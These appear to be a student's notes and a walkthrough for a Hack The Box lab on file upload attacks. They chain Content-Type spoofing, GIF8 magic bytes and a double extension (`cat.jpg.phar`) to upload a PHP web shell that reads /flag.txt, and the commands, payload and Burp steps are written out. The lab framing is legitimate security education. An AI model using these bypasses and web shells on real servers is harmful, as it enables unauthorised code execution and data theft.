# NOTE — Type Filters

## ID
531

## Module
File Upload Attacks

## Kind
notes

## Title
Section 7 — Type Filters

## Description
Bypass Content-Type header and MIME-Type (magic bytes) file content validation, combined with all previous filter bypasses (client-side, blacklist, whitelist), to upload and execute a PHP web shell.

## Tags
file-upload, content-type, mime-type, magic-bytes, gif8, burp-repeater

## Commands
- `echo "GIF8" > shell.php`
- `echo '<?php system("cat /flag.txt"); ?>' >> shell.php`
- `file shell.php` — verify MIME type shows GIF
- `wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt`
- `cat web-all-content-types.txt | grep 'image/' > image-content-types.txt`
- `curl http://<TARGET_IP>:<PORT>/profile_images/cat.jpg.phar`

## What This Section Covers
Beyond extension-based filters, modern web apps validate file content via the Content-Type header and MIME-Type (magic bytes). Content-Type is client-controlled and trivially spoofed in Burp. MIME-Type checks inspect the first bytes of the file (file signature), but can be fooled by prepending magic bytes like `GIF8` before PHP code. When all five filter layers are active (client-side, blacklist, whitelist, Content-Type, MIME-Type), you must chain all bypass techniques together.

## Methodology
1. Upload a normal image, intercept the request in Burp, and send to Repeater — this gives a valid request template.
2. **Bypass Content-Type filter**: keep the file's Content-Type header as `image/jpg` or change to `image/gif` — both are in the allowed image types.
3. **Bypass MIME-Type filter**: replace the file content with `GIF8` on the first line (imitates a GIF file signature), then add `<?php system('cat /flag.txt'); ?>` on the next line.
4. **Identify blacklist gaps**: send request to Intruder, fuzz the PHP extension (`cat.jpg.§php§`) with the PHP extensions wordlist. Look for extensions that return "Only images are allowed" instead of "Extension not allowed" — these passed the blacklist but failed the whitelist (e.g., `.phar`).
5. **Bypass whitelist + blacklist together**: use double extension `cat.jpg.phar` — `.jpg` satisfies the whitelist, `.phar` avoids the blacklist, and Apache's `FilesMatch` executes `.phar` as PHP.
6. Send the final request in Repeater — "File successfully uploaded."
7. Access `http://<TARGET_IP>:<PORT>/profile_images/cat.jpg.phar` to execute the payload and read the flag.

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1 — Bypass all 5 filters to read /flag.txt | (flag here) | `cat.jpg.phar` with `GIF8` magic bytes + `image/jpg` Content-Type + `<?php system('cat /flag.txt'); ?>` payload |

## Key Takeaways
- Content-Type header is set by the browser (client-side) — trivially spoofed by changing it in Burp to any allowed type like `image/jpg`.
- MIME-Type validation uses `mime_content_type()` which inspects file signatures (magic bytes). Prepending `GIF8` fools it into identifying the file as a GIF regardless of actual content.
- `GIF8` is the easiest magic byte to inject because it's printable ASCII — other image formats use non-printable bytes.
- When multiple filters stack (client-side + blacklist + whitelist + Content-Type + MIME-Type), you must chain all bypasses: spoofed Content-Type header + GIF8 magic bytes + reverse/double extension (`cat.jpg.phar`).
- HTTP upload requests have TWO Content-Type headers — one for the full request (top) and one for the file (bottom). Usually you modify the file's Content-Type, but in some cases you need the main one.
- The Intruder response differentiation technique is crucial: "Extension not allowed" = blacklisted; "Only images are allowed" = passed blacklist but failed another filter. This tells you exactly which extensions survive the blacklist.

## Gotchas
- The `GIF8` prefix will appear in the command output (e.g., `GIF8\nHTB{...}`). Don't confuse it with an error — the PHP still executed, `GIF8` is just printed as plaintext before the PHP runs.
- Don't forget: you need both `GIF8` magic bytes AND the correct Content-Type header. One without the other will fail if both checks are active.
- Intruder fuzzing with `.jpg.§php§` extension shows you blacklist behavior, but none of those uploads will succeed because they fail the whitelist. You need to flip to `cat.jpg.phar` (double extension) in Repeater for the final working upload.

## References
- **PHP Extensions Wordlist (Intruder fuzzing)**: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

# HTB Solution

## Question 1

### "The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"

After spawning the target machine, students first need to upload any normal picture to intercept the request sent using `Burp Suite` and send it to `Repeater`, so that they can know what type of filters are in place:

![File_Upload_Attacks_Walkthrough_Image_22.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_22.png)

![File_Upload_Attacks_Walkthrough_Image_23.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_23.png)

Students can either keep the current value of the `Content-Type` header or change it to `image/gif`. However, for the file content, students need to make it as `GIF8`, thus making its signature as a `GIF` image:

![File_Upload_Attacks_Walkthrough_Image_24.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_24.png)

On a new line, students need to add PHP code that will print out the flag file:

        php
`<?php system('cat /flag.txt'); ?>`

![File_Upload_Attacks_Walkthrough_Image_25.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_25.png)

After clicking on the "Send" button, students will notice that the file will be successfully uploaded, thus they bypassed both the `Content-Type` and `File Content` filters:

![File_Upload_Attacks_Walkthrough_Image_26.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_26.png)

Students now need to bypass the whitelist and blacklist filters, thus, they need to send the request to `Intruder` (`Ctrl`+ `I`), click on "Clear §", then add `§` between `.jpg`:

![File_Upload_Attacks_Walkthrough_Image_27.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_27.png)

Students then need to copy the items of this PHP extensions list from [github](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) and paste them under "Payload Options":

![File_Upload_Attacks_Walkthrough_Image_18.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_18.png)

Additionally, students need to disable URL-encoding:

![File_Upload_Attacks_Walkthrough_Image_19.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_19.png)

After clicking on "Start Attack", students will not get useful hits, as only images get uploaded, and none of them can execute code. However, students will notice that there are few PHP extensions that do not get blocked by the blacklist filter, as they show a different response from "Extension not allowed", which is "Only images are allowed", such as the case with the with the `.phar` extension:

![File_Upload_Attacks_Walkthrough_Image_28.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_28.png)

Students now need to use the `double extension` method, making the file name `cat.jpg.phar` in `Repeater` and sending the modified intercepted request:

![File_Upload_Attacks_Walkthrough_Image_29.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_29.png)

Since the file has been uploaded successfully, students at last need to use either `cURL` or the browser to attain the flag from the URL:

        shell
`http://STMIP:STMPO/profile_images/cat.jpg.phar`

![File_Upload_Attacks_Walkthrough_Image_30.png](https://academy.hackthebox.com/storage/walkthroughs/47/File_Upload_Attacks_Walkthrough_Image_30.png)

